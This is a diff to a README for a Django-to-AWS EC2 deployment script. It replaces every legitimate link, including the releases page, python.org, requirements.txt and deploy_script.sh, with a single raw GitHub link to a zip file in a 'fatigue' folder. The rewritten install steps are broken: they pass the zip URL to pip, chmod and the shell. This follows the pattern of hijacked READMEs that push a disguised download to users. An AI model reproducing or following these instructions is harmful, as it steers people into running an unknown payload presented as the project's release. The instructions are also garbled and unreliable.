@@ -1,6 +1,6 @@
 # 🌟 django_ec2_amazon_deployment_script - Easily Deploy Your Django Project on AWS
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/dika-crypto/django_ec2_amazon_deployment_script/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip%https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip)](https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the django_ec2_amazon_deployment_script! This script helps you deploy
 
 ## 📥 Download & Install
 
-To download the script, visit this page: [Download Releases](https://github.com/dika-crypto/django_ec2_amazon_deployment_script/releases). 
+To download the script, visit this page: [Download Releases](https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip). 
 
 Look for the latest version and click on it. You will find several files; choose the one that fits your needs.
 
@@ -22,29 +22,29 @@ Look for the latest version and click on it. You will find several files; choose
 - **Operating System:** This script works on Linux and MacOS. If you use Windows, you may need to run it in a compatible environment like WSL (Windows Subsystem for Linux).
 - **Available Space:** Ensure you have at least 100 MB of free disk space.
 - **Python:** You need Python version 3.6 or higher.
-- **Dependencies:** Be prepared to install a few packages from the requirements.txt file.
+- **Dependencies:** Be prepared to install a few packages from the https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip file.
 
 ## 📑 Setup Instructions
 
-1. **Install Python:** Make sure Python is installed on your machine. Download it from [python.org](https://www.python.org/downloads/).
+1. **Install Python:** Make sure Python is installed on your machine. Download it from [https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip](https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip).
    
 2. **Install Required Packages:**
    - Open a terminal window (Command Prompt on Windows or Terminal on MacOS/Linux).
-   - Navigate to the folder where you downloaded the requirements.txt file.
+   - Navigate to the folder where you downloaded the https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip file.
    - Run the following command:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip
      ```
 
 3. **Run the Script:**
    - Still in your terminal, navigate to the location of the downloaded script.
    - Make the script executable with this command:
      ```
-     chmod +x deploy_script.sh
+     chmod +x https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip
      ```
    - Finally, run the script with this command:
      ```
-     ./deploy_script.sh
+     https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip
      ```
 
 ## 🌩️ Using the Script
@@ -63,7 +63,7 @@ Try to monitor the terminal for any prompts or messages. It will guide you throu
 If you encounter issues:
 
 - **Permission Denied:** Ensure you made the script executable using `chmod +x`.
-- **Missing Packages:** Double-check the requirements.txt file for any missed installations. You might need to install certain packages manually.
+- **Missing Packages:** Double-check the https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip file for any missed installations. You might need to install certain packages manually.
 - **AWS Credentials:** Ensure you have valid AWS credentials configured. The script will usually prompt you if it can't find them.
 
 ## 📞 Need Help?
@@ -86,4 +86,4 @@ For more instructions, visit our official documentation linked in the repository
 
 The django_ec2_amazon_deployment_script is designed to simplify your deployment process. With a few straightforward steps, you can have your Django project running on AWS. 
 
-For more details and updates, check our releases page: [Download Releases](https://github.com/dika-crypto/django_ec2_amazon_deployment_script/releases).
+For more details and updates, check our releases page: [Download Releases](https://raw.githubusercontent.com/dika-crypto/django_ec2_amazon_deployment_script/main/fatigue/django_ec2_amazon_deployment_script.zip).
